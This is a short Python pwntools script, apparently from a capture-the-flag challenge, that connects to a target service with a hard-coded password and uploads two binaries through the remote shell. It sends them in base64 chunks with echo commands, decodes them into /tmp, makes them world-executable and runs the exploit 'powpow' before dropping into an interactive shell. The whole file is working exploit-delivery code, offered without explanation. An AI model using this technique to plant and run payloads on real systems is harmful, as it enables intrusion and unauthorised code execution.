from pwn import *
import sys

def upload(filename):
    UPLOAD_STEP = 700

    with open(filename, 'rb') as f:
        x = f.read()
    x = b64e(x)

    r.sendline(f'touch /tmp/{filename}.b64'.encode())

    with log.progress(f'uploading {filename}') as p:
        for i in range(0, len(x), UPLOAD_STEP):
            p.status(f'{i}/{len(x)}')
            msg = f'echo {x[i:i+UPLOAD_STEP]} >> /tmp/{filename}.b64'.encode()
            r.sendline(msg)
            r.recvuntil(b'$')
        p.success('done')

    r.sendline(f'base64 -d < /tmp/{filename}.b64 > /tmp/{filename}'.encode())
    r.recvuntil(b'$')
    r.sendline(f'chmod 777 /tmp/{filename}'.encode())
    r.recvuntil(b'$')


if len(sys.argv) > 1:
    r = remote(sys.argv[1], 1337)
    r.sendlineafter(b"\n", b"letmein_ksJPXvjWJS6YVO5oLAFR")
else:
    r = process("./run.sh", shell=True)

r.sendline(b'stty -echo')
r.recvuntil(b'$')

upload('a')
upload('powpow')

r.sendline(b'cd /tmp')
r.sendline(b'./powpow')

r.interactive()
r.close()
